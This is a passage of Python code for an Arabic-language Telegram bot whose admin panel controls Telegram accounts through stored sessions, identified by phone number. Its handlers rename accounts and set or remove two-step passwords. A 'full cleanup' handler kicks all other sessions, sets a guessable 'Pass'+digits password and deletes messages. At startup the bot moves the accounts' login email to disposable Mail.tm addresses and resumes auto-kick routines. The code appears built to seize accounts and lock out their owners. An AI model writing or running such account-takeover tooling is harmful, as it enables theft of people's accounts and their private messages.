    await callback.message.edit_text(
        f"✏️ أدخل اليوزر الجديد للحساب <code>{h(phone)}</code>:\n(بدون @)" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    await callback.answer()


@dp.message(AdminFlow.changing_user)
async def process_username_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    new_u = message.text.strip().replace("@", "")
    result = await session_manager.change_username(phone, new_u)
    txt = (
        f"✅ تم تغيير اليوزر إلى @{h(new_u)}"
        if result["success"]
        else f"❌ فشل: {h(result.get('error', ''))}"
    )
    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    await state.clear()


# ──────────────────────────────────────────
# تغيير الاسم
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("ch_name_"))
async def admin_change_name(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[8:]
    if not await _guard_session(callback, phone):
        return
    await state.set_state(AdminFlow.changing_name)
    await state.update_data(phone=phone)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await callback.message.edit_text(
        f"📝 أدخل الاسم الجديد للحساب <code>{h(phone)}</code>:" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    await callback.answer()


@dp.message(AdminFlow.changing_name)
async def process_name_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    parts = message.text.strip().split(" ", 1)
    first = parts[0]
    last  = parts[1] if len(parts) > 1 else ""
    result = await session_manager.change_name(phone, first, last)
    txt = (
        f"✅ تم تغيير الاسم إلى: {h(first)} {h(last)}".strip()
        if result["success"]
        else f"❌ فشل: {h(result.get('error', ''))}"
    )
    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    await state.clear()


# ──────────────────────────────────────────
# التحقق بخطوتين
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("ch_2fa_"))
async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[7:]
    if not await _guard_session(callback, phone):
        return
    session = await database.get_session_by_phone(phone)
    has_2fa = bool(session and session["two_fa"])
    current = session["two_fa"] if has_2fa else None

    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await state.set_state(AdminFlow.changing_2fa)
    await state.update_data(phone=phone, old_2fa=current, has_2fa=has_2fa)

    txt = (
        f"🔐 الحساب <code>{h(phone)}</code> لديه تحقق بخطوتين حالياً.\n\n"
        f"أدخل كلمة المرور <b>الجديدة</b>:\n"
        f"(أو أرسل <code>remove</code> لإزالة التحقق نهائياً)"
        if has_2fa else
        f"🔐 الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين.\n\n"
        f"أدخل كلمة المرور الجديدة لتفعيل التحقق بخطوتين:"
    )
    await callback.message.edit_text(
        txt + ADMIN_FOOTER, parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    await callback.answer()


@dp.message(AdminFlow.changing_2fa)
async def process_2fa_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data    = await state.get_data()
    phone   = data.get("phone")
    old_2fa = data.get("old_2fa")
    has_2fa = data.get("has_2fa", False)
    new_2fa = message.text.strip()

    await edit_or_send(
        aid, aid,
        "⏳ جاري تطبيق التغيير على الحساب..." + ADMIN_FOOTER,
        markup=back_to_session_keyboard(phone)
    )

    if new_2fa.lower() == "remove":
        if not has_2fa:
            await edit_or_send(
                aid, aid,
                f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً." + ADMIN_FOOTER,
                markup=back_to_session_keyboard(phone)
            )
        else:
            result = await session_manager.remove_two_fa(phone, old_2fa)
            txt = (
                f"✅ تم إزالة التحقق بخطوتين من الحساب <code>{h(phone)}</code> بنجاح!"
                if result["success"]
                else f"❌ فشل الإزالة: <code>{h(result.get('error', ''))}</code>"
            )
            await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    else:
        result = await session_manager.set_two_fa(phone, new_2fa, old_2fa if has_2fa else None)
        txt = (
            f"✅ تم تغيير التحقق بخطوتين للحساب <code>{h(phone)}</code> بنجاح!\n"
            f"🔐 كلمة المرور الجديدة: <code>{h(new_2fa)}</code>"
            if result["success"]
            else f"❌ فشل التغيير: <code>{h(result.get('error', ''))}</code>"
        )
        await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
    await state.clear()


# ──────────────────────────────────────────
# التنظيف الشامل
# ──────────────────────────────────────────
@dp.callback_query(F.data.startswith("full_kick_"))
async def admin_full_cleanup(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    phone = callback.data[10:]
    if not await _guard_session(callback, phone):
        return
    new_pw = "Pass" + phone[-4:]

    await callback.message.edit_text(
        "⏳ جاري التنظيف الشامل (طرد → 2FA → حذف رسائل)..." + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    res = await session_manager.admin_full_cleanup(phone, new_pw)

    if res["success"]:
        result_msg = (
            "✅ تم التنظيف الشامل:\n"
            f"✔️ طرد الجلسات الأخرى\n"
            f"✔️ تفعيل 2FA\n"
            f"✔️ حذف الرسائل\n"
            f"🔒 تم تأمين الجلسة\n\n"
            f"🔑 الباسوورد: <code>{h(new_pw)}</code>"
        )
    else:
        step = res.get("step", "")
        if step == "kick":
            result_msg = f"❌ فشل الطرد — لم يُنفَّذ 2FA:\n<code>{h(res.get('error',''))}</code>"
        elif step == "2fa":
            result_msg = (
                f"✔️ تم الطرد بنجاح\n"
                f"❌ فشل 2FA:\n<code>{h(res.get('error',''))}</code>"
            )
        else:
            result_msg = f"❌ فشل: <code>{h(res.get('error',''))}</code>"

    await callback.message.edit_text(
        result_msg + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(phone)
    )
    await callback.answer()


# ──────────────────────────────────────────
# نقطة التشغيل
# ──────────────────────────────────────────
async def _startup_email_migration():
    """ترحيل بريد Login للحسابات القديمة + استئناف جدولة الطرد."""
    try:
        pending = await database.get_sessions_needing_email_migration()
        if not pending:
            return
        logging.info("starting email migration for %d sessions", len(pending))
        stats = await session_manager.migrate_old_sessions_emails()
        await notify_admins(
            f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
            f"✅ نجح: {stats['migrated']}\n"
            f"❌ فشل: {stats['failed']}\n"
            f"📊 الإجمالي: {stats['total']}"
            + ADMIN_FOOTER
        )
    except Exception as e:
        logging.error("email migration startup: %s", e)
    await session_manager.resume_auto_kick_pipelines()


async def main():
    await database.init_db()
    logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
    asyncio.ensure_future(session_watchdog())
    asyncio.ensure_future(_startup_email_migration())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
